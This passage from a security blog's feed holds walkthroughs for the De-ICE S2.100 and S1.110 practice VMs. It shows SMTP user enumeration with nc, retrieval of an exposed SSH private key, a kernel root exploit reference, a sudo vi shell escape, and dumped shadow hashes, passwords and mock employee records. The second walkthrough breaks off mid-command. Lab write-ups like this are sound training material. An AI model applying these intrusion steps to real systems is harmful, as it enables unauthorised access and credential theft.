</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# for i in $(cat /usr/share/ncrack/default.usr); do echo $i; echo -e &ldquo;\nehlo lol\nmail from:$i@slax.example.net\nrcpt to:$i\nquit\n&rdquo; | nc 192.168.2.100 25; done  | grep -i &lsquo;Recipient ok&rsquo;
</span><span class='line'>250 2.1.5 root&hellip; Recipient ok
</span><span class='line'>250 2.1.5 operator&hellip; Recipient ok
</span><span class='line'>250 2.1.5 manager&hellip; Recipient ok
</span><span class='line'>250 2.1.5 Manager&hellip; Recipient ok
</span><span class='line'>250 2.1.5 adm&hellip; Recipient ok
</span><span class='line'>250 2.1.5 lp&hellip; Recipient ok
</span><span class='line'>250 2.1.5 MAIL&hellip; Recipient ok
</span><span class='line'>250 2.1.5 system&hellip; Recipient ok
</span><span class='line'>250 2.1.5 MANAGER&hellip; Recipient ok
</span><span class='line'>250 2.1.5 OPERATOR&hellip; Recipient ok
</span><span class='line'>250 2.1.5 halt&hellip; Recipient ok
</span><span class='line'>250 2.1.5 Root&hellip; Recipient ok
</span><span class='line'>250 2.1.5 SYSTEM&hellip; Recipient ok
</span><span class='line'>250 2.1.5 ftp&hellip; Recipient ok
</span><span class='line'>250 2.1.5 mail&hellip; Recipient ok
</span><span class='line'>250 2.1.5 toor&hellip; Recipient ok
</span><span class='line'>250 2.1.5 ROOT&hellip; Recipient ok
</span><span class='line'>250 2.1.5 shutdown&hellip; Recipient ok
</span><span class='line'>250 2.1.5 bin&hellip; Recipient ok
</span><span class='line'>250 2.1.5 POSTMASTER&hellip; Recipient ok
</span><span class='line'>250 2.1.5 nobody&hellip; Recipient ok
</span><span class='line'>250 2.1.5 games&hellip; Recipient ok
</span><span class='line'>250 2.1.5 postmaster&hellip; Recipient ok
</span><span class='line'>250 2.1.5 NEWS&hellip; Recipient ok
</span><span class='line'>250 2.1.5 sync&hellip; Recipient ok
</span><span class='line'>250 2.1.5 INGRES&hellip; Recipient ok
</span><span class='line'>250 2.1.5 daemon&hellip; Recipient ok
</span><span class='line'>250 2.1.5 uucp&hellip; Recipient ok
</span><span class='line'>250 2.1.5 Operator&hellip; Recipient ok
</span><span class='line'>250 2.1.5 webmaster&hellip; Recipient ok
</span><span class='line'>250 2.1.5 news&hellip; Recipient ok</span></code></pre></td></tr></table></div></figure></p>

<p>We used CEWL to create wordlist (userlist.txt) to reveal another user accounts.
Before we use this command, it&rsquo;s good to check if the disk is not full for
proper SMTP functionality.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:# for i in $(cat ~/vulnhub/DE-ICE-S2.100/userlist.txt); do echo $i; echo -e &ldquo;\nehlo lol\nmail from:$i@slax.example.net\nrcpt to:$i\nquit\n&rdquo; | nc 192.168.2.100 25; done  | grep -i &lsquo;Recipient ok&rsquo;
</span><span class='line'>250 2.1.5 havisham&hellip; Recipient ok
</span><span class='line'>250 2.1.5 magwitch&hellip; Recipient ok
</span><span class='line'>250 2.1.5 pirrip&hellip; Recipient ok</span></code></pre></td></tr></table></div></figure></p>

<p>Again, this could be automatized using smtp-user-enum script:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:# smtp-user-enum -M RCPT -f &lt;a href="&#109;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#114;&#111;&#111;&#x74;&#x40;&#x73;&#x6c;&#97;&#120;&#46;&#x65;&#120;&#x61;&#109;&#x70;&#x6c;&#x65;&#46;&#110;&#x65;&#x74;">&#x72;&#x6f;&#x6f;&#x74;&#x40;&#x73;&#108;&#97;&#120;&#x2e;&#101;&#x78;&#97;&#109;&#112;&#x6c;&#x65;&#46;&#x6e;&#x65;&#x74;&lt;/a> -U userlist.txt -t 192.168.2.100</span></code></pre></td></tr></table></div></figure></p>

<p>Dirb found the following URLs:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.2.101/~havisham/">http://192.168.2.101/~havisham/&lt;/a>
</span><span class='line'>&lt;a href="http://192.168.2.101/~magwich/">http://192.168.2.101/~magwich/&lt;/a>
</span><span class='line'>&lt;a href="http://192.168.2.101/~pirrip/">http://192.168.2.101/~pirrip/&lt;/a>
</span><span class='line'>&lt;a href="http://192.168.2.101/~pirrip/.ssh/">http://192.168.2.101/~pirrip/.ssh/&lt;/a></span></code></pre></td></tr></table></div></figure></p>

<p>We download the private key of pirrip user and log in:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&mdash;&ndash;BEGIN RSA PRIVATE KEY&mdash;&ndash;
</span><span class='line'>MIIEoQIBAAKCAQEA1pfb/CVukUw4Xe67YLEZzVHWNax0zJjI1CfcsoEGylmmtlA6
</span><span class='line'>iXHi41nLshzXu9n536JfM9LFAWGqefBVX7Bzd/fC4+jHS3q89IK9FP7gFPwEmlNH
</span><span class='line'>CwPX0ADxDFyB1lJOFffJ9gVw3VgHCaCPgS70UqJD0hZFDMSDMoBa91PylFQR0m58
</span><span class='line'>nMq8DsGRbeC5hTdpLXKfBuW8v/lFuNEWVWNcZDie82aiJg8WRUUIrzeGZSR3+cG1
</span><span class='line'>hi6za67VIi+ce8fFuBvIgaEpvJ0JSIX7zPLUV10ezW1NQRNplKSam3TIYI3+Ywuh
</span><span class='line'>lcgpEyliHYReN6v91+um2c6LNy9y/vx2Akci5QIBIwKCAQEAvhF5s3GcchBPLqA/
</span><span class='line'>kCfVBk/MW2zcerM1iLWXlsoNVCOFB+Co4CMKyV4pcd8IOKsfJSlqQ9fwUa5GiUKU
</span><span class='line'>wne2urbf0S1CzdMcY4m9al4W7gPJkACeAnEeO+OTq9zoBvhxDCSc79ju7+7hqXD0
</span><span class='line'>IfZjXyIBjjD7VHOKJWpfMtVTMunBCMqoAMa2veuN6LgDJweQNi7kon4qcj4SghGI
</span><span class='line'>bdBv/Cnk7PMkG+DhafTRWyXGMWFpTHV4BNKv0i+k4lVV1oP9nJnh9jglY4EkD9LD
</span><span class='line'>0Yt2QZt+XMTlxScsjcBpVGc9m4ZrgmRZGV0PTyMuWJtURkDBYPizkiPjjSZfUbyZ
</span><span class='line'>y9QECwKBgQDsR9wLzrQbJIaOX8dG4rEt8pQHdYK7KCM8Bcq45iKKPzeLxchguM3o
</span><span class='line'>+y9nRz5x8RWXWZUMl7PldoqwmrKh6WVCrdJ7mghPTYx3Djhcaf8q5XFTUhZH4xhB
</span><span class='line'>72g1H6+JCECUjAFfjoSTOEswCFKYssgYA22x3fvLGg3S8f0UjjE1xQKBgQDogKVg
</span><span class='line'>iyXCE833evccfrd/otsyVcxNincunAtYDAsqa2ZrjXL3oFwNwfC1CVKPhqDlnG46
</span><span class='line'>M1tiSeYXygPbuPbHzRdu0ZuG7jRxxVdndl52gq/Zt8MKNRD9mdbFRcRMXmMRfaE4
</span><span class='line'>RXdry9eB4rPywfWgJPGNVtOFZP6PRVv+IpoqoQKBgBRArHYKZzWGybRunA1j400U
</span><span class='line'>ytwRYvoZYhsWcHY/nI+Bwu65Lm6wwTE6GgGJw4Yb+olQ0kLoboFh7qFsWHRHNJCv
</span><span class='line'>0DZ66sT4BLm/Y+qp/+275SRmHyq7sZ9AaASNr/XNgeDYzOru9Wu0XjdRK6awPQlf
</span><span class='line'>YSyAvc+UhNeRFbFOBDfPAoGAVlurI9vpc/i6N1mO+/SNTKo0KKOGZfGZ+16H3t/m
</span><span class='line'>496/pEp7KMaIl2VKxuY0m7WpedsEXsKeSRQiQ1mpqWH1QuXG4AS2HCyXIvGG3Uk5
</span><span class='line'>B3JekrH3/HocQO//UJZBmLVX/y6pmI7UlcC9wodnaMuzAPfHbwL+G5qKb7qtI+D3
</span><span class='line'>busCgYATj4y+8msxNWRRNbHWAV7G0OurPDeZJ8F8NDLpM22X8fM08wgGRwkW4fpa
</span><span class='line'>A+J8tN2ibiDqw29W6Rc1/4evAPbo3GR932W/ELOTOpP2yquiwoSxPG+HCLHmDITr
</span><span class='line'>1qGHJRSOiFzo99iS5aQRhUvdl3M0lz1Cort7hjRKUkSWcT02Rw==
</span><span class='line'>&mdash;&ndash;END RSA PRIVATE KEY&mdash;&ndash;</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# chmod 600 pirrip-rsa.ssh
</span><span class='line'>root@kali:~# ssh -l pirrip 192.168.2.100 -i pirrip-rsa.ssh
</span><span class='line'>Linux 2.6.16.
</span><span class='line'>pirrip@slax:~$&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>pirrip@slax:/etc$ cat /etc/passwd
</span><span class='line'>root:x:0:0::/root:/bin/bash
</span><span class='line'>bin:x:1:1:bin:/bin:
</span><span class='line'>daemon:x:2:2:daemon:/sbin:
</span><span class='line'>adm:x:3:4:adm:/var/log:
</span><span class='line'>lp:x:4:7:lp:/var/spool/lpd:
</span><span class='line'>sync:x:5:0:sync:/sbin:/bin/sync
</span><span class='line'>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
</span><span class='line'>halt:x:7:0:halt:/sbin:/sbin/halt
</span><span class='line'>mail:x:8:12:mail:/:
</span><span class='line'>&lt;a href="news:x:9:13:news:/usr/lib/news:">news:x:9:13:news:/usr/lib/news:&lt;/a>
</span><span class='line'>uucp:x:10:14:uucp:/var/spool/uucppublic:
</span><span class='line'>operator:x:11:0:operator:/root:/bin/bash
</span><span class='line'>games:x:12:100:games:/usr/games:
</span><span class='line'>&lt;a href="ftp:x:14:50::/home/ftp:">ftp:x:14:50::/home/ftp:&lt;/a>
</span><span class='line'>smmsp:x:25:25:smmsp:/var/spool/clientmqueue:
</span><span class='line'>mysql:x:27:27:MySQL:/var/lib/mysql:/bin/bash
</span><span class='line'>rpc:x:32:32:RPC portmap user:/:/bin/false
</span><span class='line'>sshd:x:33:33:sshd:/:
</span><span class='line'>gdm:x:42:42:GDM:/var/state/gdm:/bin/bash
</span><span class='line'>pop:x:90:90:POP:/:
</span><span class='line'>nobody:x:99:99:nobody:/:
</span><span class='line'>pirrip:x:1000:10:Philip Pirrip:/home/pirrip:/bin/bash
</span><span class='line'>magwitch:x:1001:100:Abel Magwitch:/home/magwitch:/bin/bash
</span><span class='line'>havisham:x:1002:100:Estella Havisham:/home/havisham:/bin/bash</span></code></pre></td></tr></table></div></figure></p>

<p>The root accound can be obtained using exploit from Kali:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/usr/share/exploitdb#&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>hoagie_udp_sendmsg.c&lt;/li>
</span><span class='line'>&lt;li>LOCAL LINUX KERNEL ROOT EXPLOIT (&lt; 2.6.19) - CVE-2009-2698</span></code></pre></td></tr></table></div></figure></li>
</ul>


<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-3.1# cat /etc/shadow
</span><span class='line'>root:$1$/Ta1Q0lT$CSY9sjWR33Re2h5ohV4MX/:13882:0:::::
</span><span class='line'>bin:&lt;em>:9797:0:::::
</span><span class='line'>daemon:&lt;/em>:9797:0:::::
</span><span class='line'>adm:&lt;em>:9797:0:::::
</span><span class='line'>lp:&lt;/em>:9797:0:::::
</span><span class='line'>sync:&lt;em>:9797:0:::::
</span><span class='line'>shutdown:&lt;/em>:9797:0:::::
</span><span class='line'>halt:&lt;em>:9797:0:::::
</span><span class='line'>mail:&lt;/em>:9797:0:::::
</span><span class='line'>&lt;a href="news:*:9797:0:::::">news:*:9797:0:::::&lt;/a>
</span><span class='line'>uucp:&lt;em>:9797:0:::::
</span><span class='line'>operator:&lt;/em>:9797:0:::::
</span><span class='line'>games:&lt;em>:9797:0:::::
</span><span class='line'>&lt;a href="ftp:*:9797:0:::::">ftp:*:9797:0:::::&lt;/a>
</span><span class='line'>smmsp:&lt;/em>:9797:0:::::
</span><span class='line'>mysql:&lt;em>:9797:0:::::
</span><span class='line'>rpc:&lt;/em>:9797:0:::::
</span><span class='line'>sshd:&lt;em>:9797:0:::::
</span><span class='line'>gdm:&lt;/em>:9797:0:::::
</span><span class='line'>pop:&lt;em>:9797:0:::::
</span><span class='line'>nobody:&lt;/em>:9797:0:::::
</span><span class='line'>pirrip:$1$KEj04HbT$ZTn.iEtQHcLQc6MjrG/Ig/:13882:0:99999:7:::
</span><span class='line'>magwitch:$1$qG7/dIbT$HtTD946DE3ITkbrCINQvJ0:13882:0:99999:7:::
</span><span class='line'>havisham:$1$qbY1hmdT$sVZn89wKvmLn0wP2JnZay1:13882:0:99999:7:::&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>sh-3.1# cat /var/access/.htpasswd
</span><span class='line'>aadams:bS.PQ9hVYEqrQ</span></code></pre></td></tr></table></div></figure></p>

<p>There is another way to get root account. At first we find out the password for
pirrip user:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pirrip@slax:/var/spool/mail$ cat pirrip&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>E-Mail: &lt;a href="&#109;&#x61;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#112;&#105;&#114;&#x72;&#x69;&#112;&#x40;&#115;&#x6c;&#x61;&#120;&#x2e;&#x65;&#x78;&#97;&#x6d;&#x70;&#108;&#101;&#46;&#110;&#x65;&#x74;">&#x70;&#x69;&#114;&#x72;&#x69;&#x70;&#64;&#115;&#x6c;&#97;&#x78;&#x2e;&#101;&#x78;&#97;&#109;&#112;&#x6c;&#x65;&#x2e;&#110;&#101;&#116;&lt;/a>
</span><span class='line'>Password: 0l1v3rTw1st</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pirrip@slax:/var/spool/mail$ sudo -l
</span><span class='line'>pirrip@slax:/var/spool/mail$ sudo vi
</span><span class='line'>:!/bin/bash</span></code></pre></td></tr></table></div></figure></p>

<p>Finally, in /root/.save we obtain the following data:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>From &lt;a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#115;&#105;&#107;&#x65;&#x73;&#x40;&#115;&#x6c;&#97;&#x78;&#46;&#x65;&#120;&#97;&#109;&#112;&#108;&#101;&#46;&#x6e;&#x65;&#116;">&#x73;&#x69;&#107;&#101;&#115;&#x40;&#x73;&#x6c;&#97;&#120;&#x2e;&#x65;&#x78;&#x61;&#109;&#x70;&#108;&#101;&#46;&#110;&#x65;&#x74;&lt;/a>  Sun Jan 13 23:53:37 2008
</span><span class='line'>Return-Path: &lt;a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x73;&#105;&#107;&#101;&#115;&#64;&#115;&#x6c;&#97;&#x78;&#46;&#101;&#x78;&#x61;&#x6d;&#112;&#x6c;&#101;&#46;&#110;&#101;&#x74;">&#x73;&#x69;&#x6b;&#x65;&#x73;&#64;&#115;&#108;&#x61;&#x78;&#46;&#x65;&#120;&#97;&#x6d;&#112;&#108;&#x65;&#46;&#110;&#x65;&#x74;&lt;/a>
</span><span class='line'>Received: from slax.example.net (localhost [127.0.0.1])
</span><span class='line'>        by slax.example.net (8.13.7/8.13.7) with ESMTP id m0DNlmHb009636
</span><span class='line'>        for &lt;a href="&#x6d;&#97;&#x69;&#108;&#116;&#x6f;&#58;&#x70;&#105;&#114;&#114;&#105;&#x70;&#x40;&#115;&#x6c;&#97;&#x78;&#x2e;&#101;&#120;&#x61;&#x6d;&#112;&#x6c;&#x65;&#x2e;&#x6e;&#x65;&#x74;">&#112;&#105;&#x72;&#x72;&#105;&#112;&#x40;&#x73;&#x6c;&#x61;&#x78;&#x2e;&#x65;&#120;&#x61;&#109;&#x70;&#x6c;&#x65;&#46;&#x6e;&#101;&#x74;&lt;/a>; Sun, 13 Jan 2008 23:47:48 GMT
</span><span class='line'>Received: (from &lt;a href="&#109;&#97;&#x69;&#x6c;&#x74;&#111;&#58;&#115;&#x69;&#107;&#101;&#115;&#x40;&#115;&#x6c;&#97;&#x78;&#x2e;&#x65;&#120;&#97;&#x6d;&#x70;&#108;&#101;&#46;&#110;&#x65;&#116;">&#115;&#105;&#107;&#101;&#x73;&#64;&#x73;&#108;&#97;&#120;&#x2e;&#x65;&#120;&#x61;&#109;&#112;&#x6c;&#101;&#x2e;&#110;&#x65;&#x74;&lt;/a>)
</span><span class='line'>        by slax.example.net (8.13.7/8.13.7/Submit) id m0DNlmDI009635
</span><span class='line'>        for pirrip; Sun, 13 Jan 2008 23:47:48 GMT
</span><span class='line'>From: Bill Sikes &lt;a href="&#109;&#97;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#x73;&#x69;&#x6b;&#101;&#115;&#x40;&#x73;&#108;&#97;&#x78;&#46;&#101;&#120;&#x61;&#109;&#112;&#x6c;&#101;&#x2e;&#x6e;&#x65;&#x74;">&#115;&#x69;&#x6b;&#101;&#115;&#64;&#x73;&#x6c;&#x61;&#120;&#x2e;&#101;&#120;&#x61;&#x6d;&#112;&#x6c;&#101;&#x2e;&#x6e;&#101;&#116;&lt;/a>
</span><span class='line'>Message-Id: &lt;a href="&#x6d;&#x61;&#105;&#108;&#x74;&#x6f;&#58;&#x32;&#48;&#48;&#56;&#x30;&#x31;&#49;&#51;&#50;&#x33;&#x34;&#55;&#46;&#109;&#x30;&#x44;&#x4e;&#x6c;&#109;&#x44;&#73;&#48;&#48;&#57;&#x36;&#x33;&#53;&#x40;&#115;&#x6c;&#x61;&#x78;&#x2e;&#101;&#x78;&#x61;&#x6d;&#x70;&#x6c;&#x65;&#x2e;&#110;&#x65;&#x74;">&#50;&#48;&#x30;&#56;&#x30;&#x31;&#x31;&#51;&#x32;&#x33;&#52;&#55;&#46;&#x6d;&#48;&#x44;&#78;&#x6c;&#109;&#68;&#x49;&#48;&#x30;&#57;&#x36;&#51;&#x35;&#64;&#115;&#x6c;&#97;&#x78;&#x2e;&#x65;&#x78;&#x61;&#109;&#112;&#x6c;&#101;&#46;&#x6e;&#101;&#116;&lt;/a>
</span><span class='line'>Date: Sun, 13 Jan 2008 23:47:48 +0000
</span><span class='line'>To: &lt;a href="&#109;&#97;&#x69;&#x6c;&#116;&#111;&#x3a;&#x70;&#105;&#114;&#114;&#x69;&#112;&#x40;&#115;&#108;&#97;&#120;&#x2e;&#101;&#x78;&#97;&#x6d;&#x70;&#x6c;&#101;&#x2e;&#x6e;&#x65;&#116;">&#x70;&#105;&#114;&#x72;&#x69;&#112;&#x40;&#115;&#108;&#x61;&#120;&#46;&#101;&#120;&#x61;&#109;&#112;&#108;&#101;&#46;&#110;&#x65;&#116;&lt;/a>
</span><span class='line'>Subject: Raises
</span><span class='line'>User-Agent: nail 11.25 7/29/05
</span><span class='line'>MIME-Version: 1.0
</span><span class='line'>Content-Type: text/plain; charset=us-ascii
</span><span class='line'>Content-Transfer-Encoding: 7bit&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Here&rsquo;s the data for raises for your team:
</span><span class='line'>Philip Pirrip:  734-67-0424 5.5% $74,224
</span><span class='line'>Abel Magwitch:  816-03-0028 4.0% $53,122
</span><span class='line'>Estella Havisham: 762-93-1073 12% $84,325</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DE-ICE-S1.110]]></title>
    <link href="http://73696e65.github.io/blog/2015/05/10/de-ice-s1-dot-110/"/>
    <updated>2015-05-10T00:01:04+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/05/10/de-ice-s1-dot-110</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/de-ice-s1110,9/">De-ICE: S1.110</a></p>

<p>Nmap output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>21/tcp  open     ftp     vsftpd 2.0.4
</span><span class='line'>22/tcp  filtered ssh
</span><span class='line'>80/tcp  open     http    Apache httpd 2.2.4 ((Unix) mod_ssl/2.2.4 OpenSSL/0.9.8b DAV/2)
</span><span class='line'>631/tcp open     ipp     CUPS 1.1</span></code></pre></td></tr></table></div></figure></p>

<p>FTP anonymous login is allowed:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wget -r &lt;a href="ftp://ftp@192.168.1.110:">ftp://ftp@192.168.1.110:&lt;/a></span></code></pre></td></tr></table></div></figure></p>

<p>We have found a few files, but nothing particularly interesting:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/DE-ICE-S1.110/192.168.1.110/download# cat ./opt/cygwin/etc/passwd
</span><span class='line'>SYSTEM:&lt;em>:18:544:,S-1-5-18::
</span><span class='line'>Administrators:&lt;/em>:544:544:,S-1-5-32-544::
</span><span class='line'>Administrator:unused_by_nt/2000/xp:500:513:U-Tom-PC\Administrator,S-1-5-21-1894367954-3740816113-1455894701-500:/home/Administrator:/bin/bash
</span><span class='line'>Guest:unused_by_nt/2000/xp:501:513:U-Tom-PC\Guest,S-1-5-21-1894367954-3740816113-1455894701-501:/home/Guest:/bin/bash
</span><span class='line'>Tom:unused_by_nt/2000/xp:1000:513:U-Tom-PC\Tom,S-1-5-21-1894367954-3740816113-1455894701-1000:/home/Tom:/bin/bash
</span><span class='line'>&lt;strong>vmware_user&lt;/strong>:unused_by_nt/2000/xp:1002:513:&lt;strong>vmware_user&lt;/strong>,U-Tom-PC__vmware_user&lt;strong>,S-1-5-21-1894367954-3740816113-1455894701-1002:/home/&lt;/strong>vmware_user__:/bin/bash&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali:~/DE-ICE-S1.110# cat 192.168.1.110/download/etc/shadow
</span><span class='line'>root:$1$3OF/pWTC$lvhdyl86pAEQcrvepWqpu.:12859:0:::::
</span><span class='line'>bin:&lt;em>:9797:0:::::
</span><span class='line'>daemon:&lt;/em>:9797:0:::::
</span><span class='line'>adm:&lt;em>:9797:0:::::
</span><span class='line'>lp:&lt;/em>:9797:0:::::
</span><span class='line'>sync:&lt;em>:9797:0:::::
</span><span class='line'>shutdown:&lt;/em>:9797:0:::::
</span><span class='line'>halt:&lt;em>:9797:0:::::
</span><span class='line'>mail:&lt;/em>:9797:0:::::
</span><span class='line'>&lt;a href="news:*:9797:0:::::">news:*:9797:0:::::&lt;/a>
</span><span class='line'>uucp:&lt;em>:9797:0:::::
</span><span class='line'>operator:&lt;/em>:9797:0:::::
</span><span class='line'>games:&lt;em>:9797:0:::::
</span><span class='line'>&lt;a href="ftp:*:9797:0:::::">ftp:*:9797:0:::::&lt;/a>
</span><span class='line'>smmsp:&lt;/em>:9797:0:::::
</span><span class='line'>mysql:&lt;em>:9797:0:::::
</span><span class='line'>rpc:&lt;/em>:9797:0:::::
</span><span class='line'>sshd:&lt;em>:9797:0:::::
</span><span class='line'>gdm:&lt;/em>:9797:0:::::
</span><span class='line'>pop:&lt;em>:9797:0:::::
</span><span class='line'>nobody:&lt;/em>:9797:0:::::&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>toor             (root)</span></code></pre></td></tr></table></div></figure></p>

<p>More about cygwin format <a href="https://cygwin.com/cygwin-ug-net/ntsec.html">here</a>.</p>

<p>In /etc directory, there is a core file which contains password hashes:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/DE-ICE-S1.110/192.168.1.110/download/etc# strings core | tail -1
